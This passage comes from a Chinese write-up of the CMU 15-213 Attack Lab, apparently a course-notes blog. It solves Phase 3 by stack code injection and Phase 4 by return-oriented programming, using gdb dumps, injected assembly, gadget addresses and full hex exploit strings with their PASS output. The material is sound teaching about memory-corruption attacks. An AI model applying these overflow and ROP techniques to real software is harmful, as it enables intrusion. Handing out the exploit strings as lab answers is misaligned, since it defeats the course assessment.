</span><span id=__span-55-16><a id=__codelineno-55-16 name=__codelineno-55-16></a>0x0000000000401976<span class=w> </span>&lt;+14&gt;:<span class=w>    </span>mov<span class=w>    </span>%eax,%edx<span class=w>         </span><span class=c1># 因此执行call后到了getbuf函数时，此时 %rsp = 0x5561dca0, x $rsp 结果是 0x00401976</span>
</span><span id=__span-55-17><a id=__codelineno-55-17 name=__codelineno-55-17></a>0x0000000000401978<span class=w> </span>&lt;+16&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x403188,%esi
</span><span id=__span-55-18><a id=__codelineno-55-18 name=__codelineno-55-18></a>0x000000000040197d<span class=w> </span>&lt;+21&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x1,%edi
</span><span id=__span-55-19><a id=__codelineno-55-19 name=__codelineno-55-19></a>0x0000000000401982<span class=w> </span>&lt;+26&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax
</span><span id=__span-55-20><a id=__codelineno-55-20 name=__codelineno-55-20></a>0x0000000000401987<span class=w> </span>&lt;+31&gt;:<span class=w>    </span>call<span class=w>   </span>0x400df0<span class=w> </span>&lt;__printf_chk@plt&gt;
</span><span id=__span-55-21><a id=__codelineno-55-21 name=__codelineno-55-21></a>0x000000000040198c<span class=w> </span>&lt;+36&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-55-22><a id=__codelineno-55-22 name=__codelineno-55-22></a>0x0000000000401990<span class=w> </span>&lt;+40&gt;:<span class=w>    </span>ret
</span><span id=__span-55-23><a id=__codelineno-55-23 name=__codelineno-55-23></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span><span id=__span-55-24><a id=__codelineno-55-24 name=__codelineno-55-24></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>si
</span><span id=__span-55-25><a id=__codelineno-55-25 name=__codelineno-55-25></a><span class=m>92</span><span class=w>      </span><span class=k>in</span><span class=w> </span>visible.c
</span><span id=__span-55-26><a id=__codelineno-55-26 name=__codelineno-55-26></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-55-27><a id=__codelineno-55-27 name=__codelineno-55-27></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>test:
</span><span id=__span-55-28><a id=__codelineno-55-28 name=__codelineno-55-28></a>0x0000000000401968<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-55-29><a id=__codelineno-55-29 name=__codelineno-55-29></a><span class=o>=</span>&gt;<span class=w> </span>0x000000000040196c<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax
</span><span id=__span-55-30><a id=__codelineno-55-30 name=__codelineno-55-30></a>0x0000000000401971<span class=w> </span>&lt;+9&gt;:<span class=w>     </span>call<span class=w>   </span>0x4017a8<span class=w> </span>&lt;getbuf&gt;
</span><span id=__span-55-31><a id=__codelineno-55-31 name=__codelineno-55-31></a>0x0000000000401976<span class=w> </span>&lt;+14&gt;:<span class=w>    </span>mov<span class=w>    </span>%eax,%edx
</span><span id=__span-55-32><a id=__codelineno-55-32 name=__codelineno-55-32></a>0x0000000000401978<span class=w> </span>&lt;+16&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x403188,%esi
</span><span id=__span-55-33><a id=__codelineno-55-33 name=__codelineno-55-33></a>0x000000000040197d<span class=w> </span>&lt;+21&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x1,%edi
</span><span id=__span-55-34><a id=__codelineno-55-34 name=__codelineno-55-34></a>0x0000000000401982<span class=w> </span>&lt;+26&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax
</span><span id=__span-55-35><a id=__codelineno-55-35 name=__codelineno-55-35></a>0x0000000000401987<span class=w> </span>&lt;+31&gt;:<span class=w>    </span>call<span class=w>   </span>0x400df0<span class=w> </span>&lt;__printf_chk@plt&gt;
</span><span id=__span-55-36><a id=__codelineno-55-36 name=__codelineno-55-36></a>0x000000000040198c<span class=w> </span>&lt;+36&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-55-37><a id=__codelineno-55-37 name=__codelineno-55-37></a>0x0000000000401990<span class=w> </span>&lt;+40&gt;:<span class=w>    </span>ret
</span><span id=__span-55-38><a id=__codelineno-55-38 name=__codelineno-55-38></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span><span id=__span-55-39><a id=__codelineno-55-39 name=__codelineno-55-39></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>p<span class=w> </span><span class=nv>$rsp</span>
</span><span id=__span-55-40><a id=__codelineno-55-40 name=__codelineno-55-40></a><span class=nv>$1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>(</span>void<span class=w> </span>*<span class=o>)</span><span class=w> </span>0x5561dca8
</span><span id=__span-55-41><a id=__codelineno-55-41 name=__codelineno-55-41></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> <p><code>0x5561dca8</code>，这就是字符串存放的位置，也是调用<code>touch3</code>应该传入的参数，而<code>touch3</code>代码的地址为<code>0x4018fa</code>。从而得到代码：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-56-1>1</a></span>
<span class=normal><a href=#__codelineno-56-2>2</a></span>
<span class=normal><a href=#__codelineno-56-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-56-1><a id=__codelineno-56-1 name=__codelineno-56-1></a><span class=nf>mov</span><span class=w>    </span><span class=no>$0x5561dca8</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-56-2><a id=__codelineno-56-2 name=__codelineno-56-2></a><span class=nf>push</span><span class=w>   </span><span class=no>$0x4018fa</span>
</span><span id=__span-56-3><a id=__codelineno-56-3 name=__codelineno-56-3></a><span class=nf>ret</span>
</span></code></pre></div></td></tr></table></div> <p>字节级表示为：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-57-1>1</a></span>
<span class=normal><a href=#__codelineno-57-2>2</a></span>
<span class=normal><a href=#__codelineno-57-3>3</a></span>
<span class=normal><a href=#__codelineno-57-4>4</a></span>
<span class=normal><a href=#__codelineno-57-5>5</a></span>
<span class=normal><a href=#__codelineno-57-6>6</a></span>
<span class=normal><a href=#__codelineno-57-7>7</a></span>
<span class=normal><a href=#__codelineno-57-8>8</a></span>
<span class=normal><a href=#__codelineno-57-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-57-1><a id=__codelineno-57-1 name=__codelineno-57-1></a><span class=nl>p3.o:</span><span class=w>     </span><span class=nf>file</span><span class=w> </span><span class=no>format</span><span class=w> </span><span class=no>elf64-x86-64</span>
</span><span id=__span-57-2><a id=__codelineno-57-2 name=__codelineno-57-2></a>
</span><span id=__span-57-3><a id=__codelineno-57-3 name=__codelineno-57-3></a>
</span><span id=__span-57-4><a id=__codelineno-57-4 name=__codelineno-57-4></a><span class=nf>Disassembly</span><span class=w> </span><span class=no>of</span><span class=w> </span><span class=no>section</span><span class=w> </span><span class=no>.text</span><span class=p>:</span>
</span><span id=__span-57-5><a id=__codelineno-57-5 name=__codelineno-57-5></a>
</span><span id=__span-57-6><a id=__codelineno-57-6 name=__codelineno-57-6></a><span class=err>0000000000000000</span><span class=w> </span><span class=err>&lt;</span><span class=na>.text</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-57-7><a id=__codelineno-57-7 name=__codelineno-57-7></a><span class=err>0:</span><span class=w>  </span><span class=err>48</span><span class=w> </span><span class=nf>c7</span><span class=w> </span><span class=no>c7</span><span class=w> </span><span class=no>a8</span><span class=w> </span><span class=no>dc</span><span class=w> </span><span class=mi>61</span><span class=w> </span><span class=mi>55</span><span class=w>    </span><span class=no>mov</span><span class=w>    </span><span class=no>$0x5561dca8</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-57-8><a id=__codelineno-57-8 name=__codelineno-57-8></a><span class=err>7:</span><span class=w>  </span><span class=err>68</span><span class=w> </span><span class=nf>fa</span><span class=w> </span><span class=mi>18</span><span class=w> </span><span class=mi>40</span><span class=w> </span><span class=mi>00</span><span class=w>          </span><span class=no>push</span><span class=w>   </span><span class=no>$0x4018fa</span>
</span><span id=__span-57-9><a id=__codelineno-57-9 name=__codelineno-57-9></a><span class=nl>c:</span><span class=w>  </span><span class=nf>c3</span><span class=w>                      </span><span class=no>ret</span>
</span></code></pre></div></td></tr></table></div> <p>因此，我们期望的栈帧为：</p> <p><img alt="alt text" src=../../img/image-91.png></p> <p>逻辑如下：</p> <ul> <li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到我们注入的代码</li> <li>代码执行，先将存在caller的栈中的字符串传给参数寄存器<code>%rdi</code>，再将<code>touch3</code>的地址压入栈中</li> <li>代码执行<code>ret</code>，从栈中弹出<code>touch3</code>指令，成功跳转</li> </ul> <p>cookie <code>0x59b997fa</code>作为字符串转换为ASCII为：<code>35 39 62 39 39 37 66 61</code>，注入代码段的地址与上题一样，同样为<code>0x5561dc78</code>，这样我们就可以得到需要输入的字符串了(p3.txt)，也就是 getbuf 函数接收的用户的输入：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-58-1>1</a></span>
<span class=normal><a href=#__codelineno-58-2>2</a></span>
<span class=normal><a href=#__codelineno-58-3>3</a></span>
<span class=normal><a href=#__codelineno-58-4>4</a></span>
<span class=normal><a href=#__codelineno-58-5>5</a></span>
<span class=normal><a href=#__codelineno-58-6>6</a></span>
<span class=normal><a href=#__codelineno-58-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-58-1><a id=__codelineno-58-1 name=__codelineno-58-1></a>48 c7 c7 a8 dc 61 55 68 
</span><span id=__span-58-2><a id=__codelineno-58-2 name=__codelineno-58-2></a>fa 18 40 00 c3 00 00 00
</span><span id=__span-58-3><a id=__codelineno-58-3 name=__codelineno-58-3></a>00 00 00 00 00 00 00 00 
</span><span id=__span-58-4><a id=__codelineno-58-4 name=__codelineno-58-4></a>00 00 00 00 00 00 00 00 
</span><span id=__span-58-5><a id=__codelineno-58-5 name=__codelineno-58-5></a>00 00 00 00 00 00 00 00 
</span><span id=__span-58-6><a id=__codelineno-58-6 name=__codelineno-58-6></a>78 dc 61 55 00 00 00 00
</span><span id=__span-58-7><a id=__codelineno-58-7 name=__codelineno-58-7></a>35 39 62 39 39 37 66 61
</span></code></pre></div></td></tr></table></div> <p>从而得到：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-59-1> 1</a></span>
<span class=normal><a href=#__codelineno-59-2> 2</a></span>
<span class=normal><a href=#__codelineno-59-3> 3</a></span>
<span class=normal><a href=#__codelineno-59-4> 4</a></span>
<span class=normal><a href=#__codelineno-59-5> 5</a></span>
<span class=normal><a href=#__codelineno-59-6> 6</a></span>
<span class=normal><a href=#__codelineno-59-7> 7</a></span>
<span class=normal><a href=#__codelineno-59-8> 8</a></span>
<span class=normal><a href=#__codelineno-59-9> 9</a></span>
<span class=normal><a href=#__codelineno-59-10>10</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-59-1><a id=__codelineno-59-1 name=__codelineno-59-1></a>Linux$ ./hex2raw &lt; p3.txt &gt; ans3.txt
</span><span id=__span-59-2><a id=__codelineno-59-2 name=__codelineno-59-2></a>Linux$ ./ctarget -q -i ans3.txt
</span><span id=__span-59-3><a id=__codelineno-59-3 name=__codelineno-59-3></a>Cookie: 0x59b997fa
</span><span id=__span-59-4><a id=__codelineno-59-4 name=__codelineno-59-4></a>Touch3!: You called touch3("59b997fa")
</span><span id=__span-59-5><a id=__codelineno-59-5 name=__codelineno-59-5></a>Valid solution for level 3 with target ctarget
</span><span id=__span-59-6><a id=__codelineno-59-6 name=__codelineno-59-6></a>PASS: Would have posted the following:
</span><span id=__span-59-7><a id=__codelineno-59-7 name=__codelineno-59-7></a>        user id bovik
</span><span id=__span-59-8><a id=__codelineno-59-8 name=__codelineno-59-8></a>        course  15213-f15
</span><span id=__span-59-9><a id=__codelineno-59-9 name=__codelineno-59-9></a>        lab     attacklab
</span><span id=__span-59-10><a id=__codelineno-59-10 name=__codelineno-59-10></a>        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=phase-4_1>Phase 4<a class=headerlink href=#phase-4_1 title="Permanent link">¶</a></h3> <p>在第二部分中，我们要攻击的是 <code>rtarget</code>，它的代码内容与第一部分基本相同，但是攻击它却比第一部分要难得多，主要是因为它采用了两种策略来对抗缓冲区溢出攻击:</p> <ul> <li>栈随机化。这段程序分配的栈的位置在每次运行时都是随机的，这就使我们无法确定在哪里插入代码。</li> <li>限制可执行代码区域。它限制栈上存放的代码是不可执行的。一旦执行，则会遇到段错误。</li> </ul> <p>而 ROP：面向返回的程序设计，就是在已经存在的程序中找到特定的以<code>ret</code>结尾的指令序列为我们所用，称这样的代码段为gadget，把要用到部分的地址压入栈中，每次<code>ret</code>后又会取出一个新的gadget，于是这样就能形成一个程序链，实现我们的目的。(<code>ret</code>的字节级表示是<code>c3</code>)</p> <p><img alt="alt text" src=../../img/image-92.png></p> <p>同时，有如下指令编码表：</p> <p><img alt="alt text" src=../../img/image-93.png></p> <p>举个例子，<code>rtarget</code>有这样一个函数：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-60-1>1</a></span>
<span class=normal><a href=#__codelineno-60-2>2</a></span>
<span class=normal><a href=#__codelineno-60-3>3</a></span>
<span class=normal><a href=#__codelineno-60-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-60-1><a id=__codelineno-60-1 name=__codelineno-60-1></a><span class=kt>void</span><span class=w> </span><span class=nf>setval_210</span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=o>*</span><span class=n>p</span><span class=p>)</span>
</span><span id=__span-60-2><a id=__codelineno-60-2 name=__codelineno-60-2></a><span class=p>{</span>
</span><span id=__span-60-3><a id=__codelineno-60-3 name=__codelineno-60-3></a><span class=w>    </span><span class=o>*</span><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>3347663060U</span><span class=p>;</span>
</span><span id=__span-60-4><a id=__codelineno-60-4 name=__codelineno-60-4></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>它的汇编代码字节级表示为：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-61-1>1</a></span>
<span class=normal><a href=#__codelineno-61-2>2</a></span>
<span class=normal><a href=#__codelineno-61-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-61-1><a id=__codelineno-61-1 name=__codelineno-61-1></a><span class=err>0000000000400</span><span class=nf>f15</span><span class=w> </span><span class=err>&lt;</span><span class=no>setval_210</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-61-2><a id=__codelineno-61-2 name=__codelineno-61-2></a><span class=err>400</span><span class=nl>f15:</span><span class=w> </span><span class=nf>c7</span><span class=w> </span><span class=mi>07</span><span class=w> </span><span class=no>d4</span><span class=w> </span><span class=mi>48</span><span class=w> </span><span class=mi>89</span><span class=w> </span><span class=no>c7</span><span class=w>   </span><span class=no>movl</span><span class=w> </span><span class=no>$0xc78948d4</span><span class=p>,(</span><span class=nv>%rdi</span><span class=p>)</span>
</span><span id=__span-61-3><a id=__codelineno-61-3 name=__codelineno-61-3></a><span class=err>400</span><span class=nl>f1b:</span><span class=w> </span><span class=nf>c3</span><span class=w>                  </span><span class=no>retq</span>
</span></code></pre></div></td></tr></table></div> <p>查表可知，取其中一部分字节序列 <code>48 89 c7</code> 就表示指令<code>movq %rax, %rdi</code>，这整句指令的地址为<code>0x400f15</code>，于是从<code>0x400f18</code>开始的代码就可以变成下面这样：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-62-1>1</a></span>
<span class=normal><a href=#__codelineno-62-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-62-1><a id=__codelineno-62-1 name=__codelineno-62-1></a><span class=nf>movq</span><span class=w> </span><span class=nv>%rax</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span>
</span><span id=__span-62-2><a id=__codelineno-62-2 name=__codelineno-62-2></a><span class=nf>ret</span>
</span></code></pre></div></td></tr></table></div> <p>这个小片段就可以作为一个gadget为我们所用，其它一些可以利用的代码都在文件<code>farm.c</code>中展示了出来。</p> <p>本题的任务与Phase 2相同，都是要求返回到<code>touch2</code>函数，而phase 2中用到的注入代码为：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-63-1>1</a></span>
<span class=normal><a href=#__codelineno-63-2>2</a></span>
<span class=normal><a href=#__codelineno-63-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-63-1><a id=__codelineno-63-1 name=__codelineno-63-1></a><span class=nf>movq</span><span class=w>    </span><span class=no>$0x59b997fa</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span>
</span><span id=__span-63-2><a id=__codelineno-63-2 name=__codelineno-63-2></a><span class=nf>pushq</span><span class=w>   </span><span class=no>$0x4017ec</span>
</span><span id=__span-63-3><a id=__codelineno-63-3 name=__codelineno-63-3></a><span class=nf>ret</span>
</span></code></pre></div></td></tr></table></div> <p>我们根本不可能找到这种带特定立即数（这里的$0x59b997fa）的gadget，只能思考其他办法。考虑用两个gadget：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-64-1>1</a></span>
<span class=normal><a href=#__codelineno-64-2>2</a></span>
<span class=normal><a href=#__codelineno-64-3>3</a></span>
<span class=normal><a href=#__codelineno-64-4>4</a></span>
<span class=normal><a href=#__codelineno-64-5>5</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-64-1><a id=__codelineno-64-1 name=__codelineno-64-1></a><span class=nf>popq</span><span class=w> </span><span class=nv>%rax</span><span class=w>           </span><span class=c1># 58</span>
</span><span id=__span-64-2><a id=__codelineno-64-2 name=__codelineno-64-2></a><span class=nf>ret</span><span class=w>                 </span><span class=c1># c3</span>
</span><span id=__span-64-3><a id=__codelineno-64-3 name=__codelineno-64-3></a><span class=c1>###############     # 字节级表示</span>
</span><span id=__span-64-4><a id=__codelineno-64-4 name=__codelineno-64-4></a><span class=nf>movq</span><span class=w> </span><span class=nv>%rax</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span><span class=w>     </span><span class=c1># 48 89 c7</span>
</span><span id=__span-64-5><a id=__codelineno-64-5 name=__codelineno-64-5></a><span class=nf>ret</span><span class=w>                 </span><span class=c1># c3</span>
</span></code></pre></div></td></tr></table></div> <p>栈帧情况如下：</p> <p><img alt="alt text" src=../../img/image-94.png></p> <p>逻辑如下：</p> <ul> <li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，(注意此时的<code>rsp</code>指向了<code>cookie</code>那里) 跳转到我们的<code>gadget01</code></li> <li><code>gadget01</code>执行，将<code>cookie</code>弹出，赋值给<code>%rax</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>gadget2</code></li> <li><code>gadget2</code>执行，将<code>cookie</code>值成功赋值给参数寄存器<code>%rdi</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>touch2</code></li> </ul> <p>首要问题是找到我们需要的<code>gadget</code>，先用如下指令得到<code>rtarget</code>的汇编代码及字节级表示:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-65-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-65-1><a id=__codelineno-65-1 name=__codelineno-65-1></a>objdump<span class=w> </span>-d<span class=w> </span>rtarget<span class=w> </span>&gt;<span class=w> </span>rtarget.asm
</span></code></pre></div></td></tr></table></div> <p>查表知，<code>pop %rax</code>用<code>58</code>表示，于是查找<code>58</code>，得到指令地址为<code>0x4019ab</code>。(其中 <code>90</code> 表示<code>nop</code>，什么都不做，只是让程序计数器加一，可以忽略)</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-66-1>1</a></span>
<span class=normal><a href=#__codelineno-66-2>2</a></span>
<span class=normal><a href=#__codelineno-66-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-66-1><a id=__codelineno-66-1 name=__codelineno-66-1></a><span class=err>00000000004019</span><span class=nf>a7</span><span class=w> </span><span class=err>&lt;</span><span class=no>addval_219</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-66-2><a id=__codelineno-66-2 name=__codelineno-66-2></a><span class=err>4019</span><span class=nl>a7:</span><span class=w>       </span><span class=err>8</span><span class=nf>d</span><span class=w> </span><span class=mi>87</span><span class=w> </span><span class=mi>51</span><span class=w> </span><span class=mi>73</span><span class=w> </span><span class=mi>58</span><span class=w> </span><span class=mi>90</span><span class=w>       </span><span class=no>lea</span><span class=w>    </span><span class=mi>-0</span><span class=no>x6fa78caf</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%eax</span>
</span><span id=__span-66-3><a id=__codelineno-66-3 name=__codelineno-66-3></a><span class=err>4019</span><span class=nl>ad:</span><span class=w>       </span><span class=nf>c3</span><span class=w>                      </span><span class=no>retq</span><span class=w>                   </span><span class=no>retq</span>
</span></code></pre></div></td></tr></table></div> <p><code>movq %rax, %rdi</code>表示为<code>48 89 c7</code>，查找得到指令地址为<code>0x4019c5</code>:</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-67-1>1</a></span>
<span class=normal><a href=#__codelineno-67-2>2</a></span>
<span class=normal><a href=#__codelineno-67-3>3</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-67-1><a id=__codelineno-67-1 name=__codelineno-67-1></a><span class=err>00000000004019</span><span class=nf>c3</span><span class=w> </span><span class=err>&lt;</span><span class=no>setval_426</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-67-2><a id=__codelineno-67-2 name=__codelineno-67-2></a><span class=err>4019</span><span class=nl>c3:</span><span class=w>       </span><span class=nf>c7</span><span class=w> </span><span class=mi>07</span><span class=w> </span><span class=mi>48</span><span class=w> </span><span class=mi>89</span><span class=w> </span><span class=no>c7</span><span class=w> </span><span class=mi>90</span><span class=w>       </span><span class=no>movl</span><span class=w>   </span><span class=no>$0x90c78948</span><span class=p>,(</span><span class=nv>%rdi</span><span class=p>)</span>
</span><span id=__span-67-3><a id=__codelineno-67-3 name=__codelineno-67-3></a><span class=err>4019</span><span class=nl>c9:</span><span class=w>       </span><span class=nf>c3</span><span class=w>                      </span><span class=no>retq</span>
</span></code></pre></div></td></tr></table></div> <p>根据上图的栈帧，就能写出输入序列：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-68-1>1</a></span>
<span class=normal><a href=#__codelineno-68-2>2</a></span>
<span class=normal><a href=#__codelineno-68-3>3</a></span>
<span class=normal><a href=#__codelineno-68-4>4</a></span>
<span class=normal><a href=#__codelineno-68-5>5</a></span>
<span class=normal><a href=#__codelineno-68-6>6</a></span>
<span class=normal><a href=#__codelineno-68-7>7</a></span>
<span class=normal><a href=#__codelineno-68-8>8</a></span>
<span class=normal><a href=#__codelineno-68-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-68-1><a id=__codelineno-68-1 name=__codelineno-68-1></a>00 00 00 00 00 00 00 00
</span><span id=__span-68-2><a id=__codelineno-68-2 name=__codelineno-68-2></a>00 00 00 00 00 00 00 00
</span><span id=__span-68-3><a id=__codelineno-68-3 name=__codelineno-68-3></a>00 00 00 00 00 00 00 00
</span><span id=__span-68-4><a id=__codelineno-68-4 name=__codelineno-68-4></a>00 00 00 00 00 00 00 00
</span><span id=__span-68-5><a id=__codelineno-68-5 name=__codelineno-68-5></a>00 00 00 00 00 00 00 00
</span><span id=__span-68-6><a id=__codelineno-68-6 name=__codelineno-68-6></a>ab 19 40 00 00 00 00 00 # pop %rax和retq地址
</span><span id=__span-68-7><a id=__codelineno-68-7 name=__codelineno-68-7></a>fa 97 b9 59 00 00 00 00 # cookie值
</span><span id=__span-68-8><a id=__codelineno-68-8 name=__codelineno-68-8></a>c5 19 40 00 00 00 00 00 # movq %rax, %rdi和retq地址
</span><span id=__span-68-9><a id=__codelineno-68-9 name=__codelineno-68-9></a>ec 17 40 00 00 00 00 00 # touch2地址
</span></code></pre></div></td></tr></table></div> <p>结果：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-69-1>1</a></span>
<span class=normal><a href=#__codelineno-69-2>2</a></span>
<span class=normal><a href=#__codelineno-69-3>3</a></span>
<span class=normal><a href=#__codelineno-69-4>4</a></span>
<span class=normal><a href=#__codelineno-69-5>5</a></span>
<span class=normal><a href=#__codelineno-69-6>6</a></span>
<span class=normal><a href=#__codelineno-69-7>7</a></span>
<span class=normal><a href=#__codelineno-69-8>8</a></span>
<span class=normal><a href=#__codelineno-69-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-69-1><a id=__codelineno-69-1 name=__codelineno-69-1></a>Linux$<span class=w> </span>./hex2raw<span class=w> </span>&lt;<span class=w> </span>p4.txt<span class=w> </span><span class=p>|</span><span class=w> </span>./rtarget<span class=w> </span>-q<span class=w> </span><span class=c1># 注意从这个phase开始是rtarget，不要输错成ctarget了</span>
</span><span id=__span-69-2><a id=__codelineno-69-2 name=__codelineno-69-2></a>Cookie:<span class=w> </span>0x59b997fa
</span><span id=__span-69-3><a id=__codelineno-69-3 name=__codelineno-69-3></a>Type<span class=w> </span>string:Touch2!:<span class=w> </span>You<span class=w> </span>called<span class=w> </span>touch2<span class=o>(</span>0x59b997fa<span class=o>)</span>
</span><span id=__span-69-4><a id=__codelineno-69-4 name=__codelineno-69-4></a>Valid<span class=w> </span>solution<span class=w> </span><span class=k>for</span><span class=w> </span>level<span class=w> </span><span class=m>2</span><span class=w> </span>with<span class=w> </span>target<span class=w> </span>rtarget
</span><span id=__span-69-5><a id=__codelineno-69-5 name=__codelineno-69-5></a>PASS:<span class=w> </span>Would<span class=w> </span>have<span class=w> </span>posted<span class=w> </span>the<span class=w> </span>following:
</span><span id=__span-69-6><a id=__codelineno-69-6 name=__codelineno-69-6></a><span class=w>        </span>user<span class=w> </span>id<span class=w> </span>bovik
</span><span id=__span-69-7><a id=__codelineno-69-7 name=__codelineno-69-7></a><span class=w>        </span>course<span class=w>  </span><span class=m>15213</span>-f15
</span><span id=__span-69-8><a id=__codelineno-69-8 name=__codelineno-69-8></a><span class=w>        </span>lab<span class=w>     </span>attacklab
</span><span id=__span-69-9><a id=__codelineno-69-9 name=__codelineno-69-9></a><span class=w>        </span>result<span class=w>  </span><span class=m>1</span>:PASS:0xffffffff:rtarget:2:00<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>AB<span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>FA<span class=w> </span><span class=m>97</span><span class=w> </span>B9<span 